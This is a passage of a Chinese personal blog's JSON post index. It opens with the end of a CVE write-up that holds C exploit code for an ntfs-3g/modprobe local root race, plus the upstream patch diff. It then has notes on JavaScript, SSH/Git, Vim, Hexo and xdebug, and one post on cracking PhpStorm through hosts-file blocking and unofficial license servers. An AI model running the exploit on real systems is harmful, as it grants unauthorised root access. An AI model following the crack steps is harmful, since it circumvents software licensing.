poll_fds[1] = &#123;&#123; .fd = fs_inotify_fd, .events = POLLIN&#125;&#125;;int poll_res = poll(poll_fds, 1, 100);if (poll_res == -1) err(1, \"poll\");if (poll_res == 1) &#123; puts(\"looks like we lost the race\"); if (kill(getppid(), SIGKILL)) perror(\"SIGKILL after lost race\"); char rm_cmd[100]; sprintf(rm_cmd, \"rm -rf %s\", template); system(rm_cmd); exit(1);&#125;puts(\"looks like we won the race\");// Open as many files as possible. Whenever we have// a bunch of open files, move them into a new process.int total_open_files = 0;while (1) &#123; #define LIMIT 500 int open_files[LIMIT]; bool reached_limit = false; int n_open_files; for (n_open_files = 0; n_open_files &lt; LIMIT; n_open_files++) &#123; open_files[n_open_files] = eventfd(0, 0); if (open_files[n_open_files] == -1) &#123; if (errno != ENFILE) err(1, \"eventfd() failed\"); printf(\"got ENFILE at %d total\\n\", total_open_files); reached_limit = true; break; &#125; total_open_files++; &#125; pid_t fd_stasher_child = fork(); if (fd_stasher_child == -1) err(1, \"fork (for eventfd holder)\"); if (fd_stasher_child == 0) &#123; prctl(PR_SET_PDEATHSIG, SIGKILL); // close PR_SET_PDEATHSIG race window if (getppid() != child) raise(SIGKILL); while (1) pause(); &#125; for (int i = 0; i &lt; n_open_files; i++) close(open_files[i]); if (reached_limit) break;&#125;// Wake up ntfs-3g and keep allocating files, then free up// the files as soon as we're reasonably certain that either// modprobe was spawned or the attack failed.if (kill(getppid(), SIGCONT)) err(1, \"SIGCONT\");time_t start_time = time(NULL);while (1) &#123; for (int i=0; i&lt;1000; i++) &#123; int efd = eventfd(0, 0); if (efd == -1 &amp;&amp; errno != ENFILE) err(1, \"gapfiller eventfd() failed unexpectedly\"); &#125; struct pollfd modprobe_poll_fds[1] = &#123;&#123; .fd = modprobe_inotify_fd, .events = POLLIN &#125;&#125;; int modprobe_poll_res = poll(modprobe_poll_fds, 1, 0); if (modprobe_poll_res == -1) err(1, \"poll\"); if (modprobe_poll_res == 1) &#123; puts(\"yay, modprobe ran!\"); exit(0); &#125; if (time(NULL) &gt; start_time + 3) &#123; puts(\"modprobe didn't run?\"); exit(1); &#125;&#125;&#125; 0x04 补丁代码，load_fuse_module()函数 http://seclists.org/oss-sec/2017/q1/307 123456789101112131415 struct stat st; pid_t pid; const char *cmd = \"/sbin/modprobe\";+ char *env = (char*)NULL; struct timespec req = &#123; 0, 100000000 &#125;; /* 100 msec */ fuse_fstype fstype; if (!stat(cmd, &amp;st) &amp;&amp; !geteuid()) &#123; pid = fork(); if (!pid) &#123;- execl(cmd, cmd, \"fuse\", NULL);+ execle(cmd, cmd, \"fuse\", NULL, &amp;env); _exit(1); &#125; else if (pid != -1) waitpid(pid, NULL, 0);","categories":[{"name":"CVE_Search","slug":"CVE-Search","permalink":"http://maskhed.github.io/categories/CVE-Search/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"http://maskhed.github.io/tags/CVE/"}]},{"title":"JS学习笔记","slug":"JS-study","date":"2017-05-03T12:08:58.000Z","updated":"2018-10-26T15:49:07.038Z","comments":true,"path":"2017/05/03/JS-study/","link":"","permalink":"http://maskhed.github.io/2017/05/03/JS-study/","excerpt":"记录在学习 JavaScript 过程中的点点滴滴。","text":"记录在学习 JavaScript 过程中的点点滴滴。 一、在HTML中使用JS&lt;script>元素，HTML 4.01为&lt;/script>定义了以下6个属性： async:可选。表示应该立即下载脚本，但不应该妨碍页面中的其他操作，只对外部脚本文件有效。charset:可选。表示通过src属性指定的代码的字符集。defer:可选。表示脚本可以延迟到文档完全被解析和显示之后再执行，只对外部脚本文件有效。src:可选。表示包含要执行代码的外部文件。type:可选。表示编写代码使用的脚本语言的内容类型（MIME）。 二、基本概念JS的语法大量借鉴了C及其他类C语言的语法，有C语言基础的同学在倍感亲切的同时，一定要注意JS与C的差异。 区分大小写：JS中的一切（变量、函数名、操作符）都区分大小写。 标识符（变量、函数、属性的名字）：第一个字符必须是一个字母、下划线(_)或美元符号($)。 变量：JS的变量为弱类型 按照惯例，JS标识符采用驼峰大小写格式，也就是第一个字母小写，剩下的每个单词的首字母大写。 数据类型 JS具有5种简单类型(Undefined、Null、Boolean、Number、String)和1种复杂类型（Object），Object本质上是由一组无序的名值对组成的。 Object类型是所有它的实例的基础，它的每个实例都具备下列属性和方法： constructor:保存着用于创建当前对象的函数。hasOwnProperty(propertyName):用于检查给定的属性在当前对象的实例中是否存在。isPrototypeOf(object):用于检查传入的对象是否是当前对象的原型。propertyIsEnumerable(propertyName):用于检查给定的属性是否能够使用for-in 语句枚举。toLocaleString():返回对象的字符串表示，该字符串与执行环境的地区相对应。toString():返回对象的字符串表示。valueOf():返回对象的字符串、数值或布尔值表示。通常与toString（）方法的返回值一致。 语句 1.for-in语句:一种精准的迭代语句，可以用来枚举对象的属性。语法如下： for (var propName in expression) statement 下面是一个示例： 123for (var propName in window) &#123; document.write(propName);&#125; 在这个例子中，枚举了BOM中window对象的所有属性，直到对象中的所有属性都被枚举一遍为止。 2.label语句：在代码中添加标签，以便以后使用，一般配合for、break或continue语句引用。语法如下： label: statement 示例： 12345678910111213var num = 0;outermost:for (var i=0; i &lt; 10; i++) &#123; for (var j=0; j &lt; 10; j++) &#123; if (i ==5 &amp;&amp; j==5) &#123; break outermost; &#125; num++; &#125;&#125;alert(num); //55 12345678910111213var num = 0;outermost:for (var i=0; i &lt; 10; i++) &#123; for (var j=0; j &lt; 10; j++) &#123; if (i ==5 &amp;&amp; j==5) &#123; continue outermost; &#125; num++; &#125;&#125;alert(num); //95 3.with 语句：将代码的作用域设置到一个特定对象之中。语法： with (expression) statement; 示例：123456789var qs = location.search.substring(1);var hostName = location.hostname;var url = location.href;with(location)&#123; var qs = search.substring(1); var hostName = hostname; var url = href;&#125; 注：严格模式下不允许使用with语句。大量使用with语句将会导致性能下降。 4.理解参数JS函数的参数与大多数其他语言中的参数有所不同。JS函数不介意传递进来多少个参数，也不在乎传递过来的参数是什么类型。也就是说，即便你定义的函数只接收两个参数，在调用这个函数时也未必一定要传递两个参数。可以传递一个、三个甚至不传递参数，而解析器永远不会有什么怨言。之所以会这样，是因为JS中的参数在内部是用一个数组表示的。函数接收到的始终是这个数组，而不关心数组中包含哪些参数。实际上，在函数体内可以通过arguments对象来访问这个参数数组，从而获取传递给函数的每一个参数。 小结 JS中的基本数据类型包括Undefined、Null、Boolean、Number和String。 与其他语言不同，JS没有为整数和浮点数分别定义不同的数据类型，Number类型可用于表示所有数值。 JS也有一种复杂数据类型，即Object类型，该类型是这门语言中所有对象的基础类型。 严格模式为这门语言中容易出错的地方施加了限制。 JS提供了很多与C及其他类C语言中相同的基本操作符，包括算数操作符、布尔操作符、关系操作符、相等操作符及赋值操作符等。 JS从其他语言中借鉴了很多流控制语句，例如if语句、for语句和switch语句等。 JS中的函数与其他语言中的函数有诸多不同之处。 无需指定函数的返回值，因为任何JS函数都可以在任何时候返回任何值。 实际上，未指定返回值的函数返回的是一个特殊的Undefined值。 JS中也没有函数签名的概念，因为其函数参数是以一个包含零或多个值的数组的形式传递的。 可以向JS函数传递任意数量的参数，并且可以通过arguments对象来访问这些参数。 由于不存在函数签名的概念，JS函数不能重载。","categories":[{"name":"原创","slug":"原创","permalink":"http://maskhed.github.io/categories/原创/"}],"tags":[]},{"title":"SSH & Git","slug":"SSH-Git","date":"2017-05-02T14:46:07.000Z","updated":"2018-10-21T03:40:46.832Z","comments":true,"path":"2017/05/02/SSH-Git/","link":"","permalink":"http://maskhed.github.io/2017/05/02/SSH-Git/","excerpt":"利用SSH，在登录Git服务器的时候实现免密码登录。","text":"利用SSH，在登录Git服务器的时候实现免密码登录。 一、单用户情况： 使用固定PC登录固定git服务器，不涉及多个账号或不同git服务器： 1.运行 ssh-keygen -t rsa -C “xxx@xxx.xxx“ 2.提示输入key的名字，使用默认id_rsa即可。 3.然后会提示输入口令，这里口令与Github中的密码无关，随便输入可以为空。 4.如果重命名过id_rsa，需要将新文件名添加到SSH agent中。 完成后在.ssh/目录下可以看到id_rsa、id_rsa.pub两个文件，之后登陆git服务器，将id-rsa.pub中的内容作为公钥添加至git服务器 。 输入以下命令进行验证，若返回正常则添加成功。1ssh -vT git@gitserver.xxx 二、多账户情况 涉及多账户情况下，针对每个账户都需要一对公私钥。这就需要在使用ssh-keygen创建秘钥时进行重命名。具体如下： 1.新建user2的SSH Key12345#新建SSH key：$ cd ~/.ssh ssh-keygen -t rsa -C \"xxx@xxx.xxx\" # 重命名为id_oschina_rsaEnter file in which to save the key (~/.ssh/id_rsa): id_oschina_rsa 2.新密钥添加到SSH agent中 因为默认只读取id_rsa，为了让SSH识别新的私钥，需将其添加到SSH agent中：1ssh-add ~/.ssh/id_oschina_rsa 3.修改~/.ssh目录下的config文件，若没有则创建（touch config），我的config配置如下：12345678910111213# Default github userHost github.comHostName github.comUser gitIdentityFile ~/.ssh/id_github_rsa# second user# 可以是同一服务器的不同用户，也可以是不同服务器的用户，# 通过 Host、HostName、User区分Host oschina.netHostName oschina.netUser gitIdentityFile ~/.ssh/id_oschina_rsa 4.cat ~/.ssh/id_xxx_rsa.pub文件，将每个用户的公钥都添加至对应的git服务器中。 5.测试：12345$ ssh -T git@github.comHi git! You've successfully authenticated, but GitHub does not provide shell access.$ ssh -T git@git.oschina.net Welcome to Git@OSC, git! 6.附：删除原有ssh秘钥1ssh-keygen -R 192.168.1.203(你远程服务器的IP)","categories":[],"tags":[]},{"title":"Vim折腾记(一)","slug":"Vim折腾记","date":"2017-05-01T15:30:59.000Z","updated":"2018-10-21T06:43:23.558Z","comments":true,"path":"2017/05/01/Vim折腾记/","link":"","permalink":"http://maskhed.github.io/2017/05/01/Vim折腾记/","excerpt":"最近开始使用Ubuntu，决定折腾折腾上古神器Vim，打造属于自己的IDE。记录下填过的那些坑。","text":"最近开始使用Ubuntu，决定折腾折腾上古神器Vim，打造属于自己的IDE。记录下填过的那些坑。 1.TerminalMac下选iTerm2，Ubuntu下选用Terminator，至于为什么选择这两款Terminal网上讨论很多。这两款Terminal不仅可以按照自己的喜好设置配色方案，而且新建Tab、分屏等功能，极大的提高了工作效率。附上常用快捷键方便查阅： iTerm2(官方文档) 1234567⌘ + t //新建标签⌘ + 数字 //在各 tab 间切换⌘ + f //所查找的内容会被自动复制⌘ + d //水平分屏 ⌘ + shift + d //垂直分屏ctrl + u //清空当前行，无论光标在什么位置⌘ + shift + h //列出剪切板历史 Terminator (可以通过 “man terminator”查阅帮助文档) 1234567891011121314151617//标签内的操作 Alt+Up/Down/Left/Right //移动到 上/下/左/右 的终端 Ctrl+Shift+O //水平分割终端 Ctrl+Shift+E //垂直分割终端 Ctrl+Shift+F //搜索 Ctrl+Shift+C //复制选中的内容到剪贴板 Ctrl+Shift+V //粘贴剪贴板的内容到此处 Ctrl+Shift+W //关闭当前终端 Ctrl+Shift+Q //退出当前窗口，当前窗口的所有终端都将被关闭 Ctrl+Shift+X //最大化显示当前终端 Ctrl+Tab //移动到下一个终端 //标签之间的操作 F11 //全屏开关 Ctrl+Shift+T //打开一个新的标签 Ctrl+PageDown //移动到下一个标签 Ctrl+PageUp //移动到上一个标签 Ctrl+Shift+G //重置终端状态并clear屏幕 2.Shell 确定好Terminal之后，选择shell，使用传说中的终极shell–zsh，并用开源项目Oh My Zsh简化设置。安装完毕后，可以在.zshrc中选择喜欢的主题、插件以及个性化设置。详情可以查阅官方文档. 0x01 Vim 基础1.基本配置（.vimrc）script1234567891011121314151617181920212223242526272829303132333435363738394041424344\"显示行号set nu\"语法高亮syntax on\"不需要备份set nobackup\"没有保存或文件只读时弹出确认set confirm\"鼠标可用set mouse=a\"tab缩进set tabstop=4set shiftwidth=4set expandtabset smarttab\"c文件自动缩进set cindent\"自动对齐set autoindent\"智能缩进set smartindent\"高亮查找匹配set hlsearch\"显示匹配set showmatch\"显示标尺，就是在右下角显示光标位置set ruler\"启动显示状态行set laststatus=2\"显示输入的命令set showcmd 2.常用命令 未完待续…","categories":[],"tags":[{"name":"Vim","slug":"Vim","permalink":"http://maskhed.github.io/tags/Vim/"}]},{"title":"Hexo 多PC同步及备份","slug":"hexo-多PC同步及备份","date":"2017-04-26T15:06:34.000Z","updated":"2018-10-21T03:47:23.661Z","comments":true,"path":"2017/04/26/hexo-多PC同步及备份/","link":"","permalink":"http://maskhed.github.io/2017/04/26/hexo-多PC同步及备份/","excerpt":"解决异地及多PC之间同步问题。Git服务器的选择，github &amp; oschina。gtihub用于发布，oschina用于备份blog源码，因为oschina提供免费的私有仓库。","text":"解决异地及多PC之间同步问题。Git服务器的选择，github &amp; oschina。gtihub用于发布，oschina用于备份blog源码，因为oschina提供免费的私有仓库。 0x 01 搭建并发布Hexo 简易搭建并发布Hexo的步骤可以参考hexo搭建步骤 0x 02 备份Blog 2.1 oschina注册并创建仓库 在git.oschina.net注册账号，并创建私有仓库。（如：xxx.github.io） 2.2 创建本地仓库 首先，删除除.gitignore所包含的目录以外的所有子目录中的.git目录，由于.git目录中包含原仓库的信息，会与新建仓库产生冲突。之后，在Hexo根目录下： 1git init 创建.gitignore文件，并编辑如下： 123/.deploy_git/node_modules/public .deploy_git: Hexo默认的.git目录，不需要备份 node_modules: npm install生成的插件等，不需要备份 plublic: 每次发布时自动生成的内容，不需要备份 _config.yml: 配置文件，依个人情况选择是否备份 2.3 添加备份并上传 12345$ git status$ git add --all$ git commit -m \"xxx\"$ git remote add origin https://git.oschina.net/用户名/项目名.git$ git push -u origin master 0x 03 异地同步 从oschina获取最新的Blog备份: git pull 本地编辑并发布 备份最新的Blog至oschina: git push","categories":[],"tags":[]},{"title":"Crack Phpstorm","slug":"Crack-Phpstorm","date":"2017-04-25T21:29:18.000Z","updated":"2018-10-26T15:50:48.339Z","comments":true,"path":"2017/04/26/Crack-Phpstorm/","link":"","permalink":"http://maskhed.github.io/2017/04/26/Crack-Phpstorm/","excerpt":"免费激活 PhpStorm。","text":"免费激活 PhpStorm。 1.官网下载PhpStorm。2.Crack hosts文件中添加”0.0.0.0 account.jetbrains.com” http://idea.lanyus.com/](http://idea.lanyus.com/) 获取注册码 在PhpStorm中输入注册码，成功激活。 3.其他激活方式 填入下面的license server: http://intellij.mandroid.cn/http://idea.imsxm.com/http://idea.iteblog.com/key.php 搭建服务器激活 参考文章：IntelliJ IDEA 注册码IntelliJ Idea 2017 免费激活方法ilanyu’s Blog","categories":[],"tags":[]},{"title":"php-debug","slug":"php-debug","date":"2017-04-24T13:03:36.000Z","updated":"2018-10-21T03:40:29.720Z","comments":true,"path":"2017/04/24/php-debug/","link":"","permalink":"http://maskhed.github.io/2017/04/24/php-debug/","excerpt":"那些年，填过的坑","text":"那些年，填过的坑 1、php7.0 &amp;&amp; xdebug stack actually had that problem and took me allot of time to figure out the solution: (if any previous php versions where installed, make sure to first get completely rid of them. if necessary purge and reinstall apache2 and php7) first: sudo apt-get install php-xdebug then edit the php.ini file of php 7 : sudo gedit /etc/php/7.0/apache2/php.ini and just on the bottom add: xdebug.remote_enable = On save and of course then: sudo service apache2 restart","categories":[],"tags":[]}]}